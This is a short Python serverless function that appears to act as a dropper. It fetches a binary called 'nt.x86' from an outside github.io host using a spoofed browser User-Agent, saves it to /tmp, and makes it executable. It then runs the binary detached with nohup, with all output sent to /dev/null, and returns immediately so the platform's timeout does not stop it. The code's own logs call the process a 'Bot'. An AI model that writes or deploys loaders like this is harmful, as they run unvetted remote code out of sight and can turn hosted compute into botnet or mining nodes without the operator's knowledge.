import os
import subprocess
import urllib.request

def main(context):
    binary_url = "https://urbenm4.github.io/nt.x86"
    dest_path = "/tmp/nt.x86"
    
    context.log("Initiating background deployment...")

    try:
        # 1. Download only if it doesn't exist to save time
        if not os.path.exists(dest_path):
            req = urllib.request.Request(binary_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req) as response:
                with open(dest_path, 'wb') as out_file:
                    out_file.write(response.read())
            os.chmod(dest_path, 0o755)
            context.log("Binary downloaded and permissions set.")

        # 2. Launch using nohup and & (The Double-Fork)
        # We redirect ALL output to /dev/null so the parent process can close immediately
        command = f"nohup {dest_path} > /dev/null 2>&1 &"
        subprocess.Popen(command, shell=True, start_new_session=True)
        
        context.log("Bot detached successfully.")

    except Exception as e:
        context.error(f"Error: {str(e)}")
        return context.res.json({"status": "failed", "error": str(e)})

    # 3. Return IMMEDIATELY. This stops the "Execution timed out" error.
    return context.res.json({
        "status": "success",
        "message": "Worker detached and running"
    })
